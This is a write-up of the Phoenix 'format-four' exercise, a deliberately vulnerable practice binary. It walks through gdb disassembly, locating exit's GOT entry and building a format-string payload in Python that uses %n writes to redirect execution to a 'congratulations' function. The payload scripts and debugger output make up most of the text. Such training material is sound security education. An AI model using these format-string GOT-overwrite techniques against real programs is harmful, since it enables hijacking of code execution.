```sh
gef➤  disass bounce
Dump of assembler code for function bounce:
   0x080484e5 <+0>:	push   ebp
   0x080484e6 <+1>:	mov    ebp,esp
   0x080484e8 <+3>:	sub    esp,0x8
   0x080484eb <+6>:	sub    esp,0xc
   0x080484ee <+9>:	push   DWORD PTR [ebp+0x8]
   0x080484f1 <+12>:	call   0x8048300 <printf@plt>
   0x080484f6 <+17>:	add    esp,0x10
   0x080484f9 <+20>:	sub    esp,0xc
   0x080484fc <+23>:	push   0x0
   0x080484fe <+25>:	call   0x8048330 <exit@plt>
End of assembler dump.
```

We see that exit@plt is located at 0x8048330.

```sh
gef➤  disass 0x8048330
Dump of assembler code for function exit@plt:
   0x08048330 <+0>:	jmp    DWORD PTR ds:0x80497e4
   0x08048336 <+6>:	push   0x18
   0x0804833b <+11>:	jmp    0x80482f0
End of assembler dump.
```

This is the function trampoline for exit. The program immediately jumps to the address stored at exit@got.plt, i.e. the global offset table entry for the libc function exit. By printing this entry, we find:

```sh
gef➤  x/1xw 0x80497e4
0x80497e4 <exit@got.plt>:	0xf7f7f543
```

We expect 0xf7f7f543 to belong to (the dynamically linked) libc, which we can confirm by listing the memory mappings:

```sh
gef➤  info proc mappings
process 1794
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /opt/phoenix/i486/format-four
	 0x8049000  0x804a000     0x1000        0x0 /opt/phoenix/i486/format-four
	0xf7f69000 0xf7f6b000     0x2000        0x0 [vvar]
	0xf7f6b000 0xf7f6d000     0x2000        0x0 [vdso]
	0xf7f6d000 0xf7ffa000    0x8d000        0x0 /opt/phoenix/i486-linux-musl/lib/libc.so
	0xf7ffa000 0xf7ffb000     0x1000    0x8c000 /opt/phoenix/i486-linux-musl/lib/libc.so
	0xf7ffb000 0xf7ffc000     0x1000    0x8d000 /opt/phoenix/i486-linux-musl/lib/libc.so
	0xf7ffc000 0xf7ffe000     0x2000        0x0
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
```

(The program must be running to be able to list the memory mappings.)

If we could overwrite the entry for exit in GOT at 0x80497e4, then when the exit function is called in bounce, the program would jump to whatever address we put in the GOT. We could redirect code execution to wherever we want, in particular, to the function "congratulations". First, let's find the address of congratulations:

```sh
gef➤  p congratulations
$1 = {<text variable, no debug info>} 0x8048503 <congratulations>
```

So we wish to write 0x8048503 (congratulations) into 0x80497e4 (exit@got.plt).

As with the previous level, the vulnerability is in the fact that we control the format string to the printf function in bounce. Let's print a few integers from the stack by using a bunch of %x conversion specifiers:

```sh
user@phoenix-amd64:~$ python -c 'print("AAAABBBB " + "%x "*14)' | /opt/phoenix/i486/format-four
Welcome to phoenix/format-four, brought to you by https://exploit.education
AAAABBBB 0 0 0 f7f81cf7 f7ffb000 ffffd618 804857d ffffc610 ffffc610 fff 0 41414141 42424242 20782520
```

We look for the A's and B's (hex 41 and 42), and conclude that the buffer starts at the 12th "argument".

The following Python script writes the address of the four individual bytes of the GOT address into the buffer, and then prints 11 arguments followed by a write to the 12th. If we use this script as input to format-four, we expect to see the number of characters _printed_ before %n to show up at exit@got.plt.

```python
# target GOT address: 0x80497e4
# value: 0x8048503

buff = ""
buff += "\xe4\x97\x04\x08"
buff += "\xe5\x97\x04\x08"
buff += "\xe6\x97\x04\x08"
buff += "\xe7\x97\x04\x08"

buff += "%x "*11

buff += "%n"

print(buff)
```

We set a breakpoint right after the call to printf and examine the GOT:

```sh
gef➤  break *0x080484f6
Breakpoint 4 at 0x80484f6
gef➤  r <<< $(python /home/user/exploit.py)
Starting program: /opt/phoenix/i486/format-four <<< $(python /home/user/exploit.py)
Welcome to phoenix/format-four, brought to you by https://exploit.education
0 0 0 f7f81cf7 f7ffb000 ffffd5d8 804857d ffffc5d0 ffffc5d0 fff 0

Breakpoint 4, 0x080484f6 in bounce ()
gef➤  x/wx 0x80497e4
0x80497e4 <exit@got.plt>:	0x00000051
```

So our python script prints 0x51 number of characters so far. By using the exact same procedure as in the previous level, we can come up with the following Python script:

```python
# target address: 0x80497e4
# value: 0x8048503

buff = ""
buff += "\xe4\x97\x04\x08"
buff += "\xe5\x97\x04\x08"
buff += "\xe6\x97\x04\x08"
buff += "\xe7\x97\x04\x08"

buff += "%x "*11

buff += "A"*int(0x103-0x51)
buff += "%n"

buff += "B"*int(0x185-0x103)
buff += "%n"

buff += "C"*int(0x204-0x185)
buff += "%n"

buff += "D"*int(0x208-0x204)
buff += "%n"

print(buff)
```

Using our script as input to format-four gives:

```sh
user@phoenix-amd64:~$ python exploit.py | /opt/phoenix/i486/format-four
Welcome to phoenix/format-four, brought to you by https://exploit.education
0 0 0 f7f81cf7 f7ffb000 ffffd618 804857d ffffc610 ffffc610 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCDDDD
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
Well done, you're redirected code execution!
```

(The program is now in an infinte loop, because we overwrote exit.)



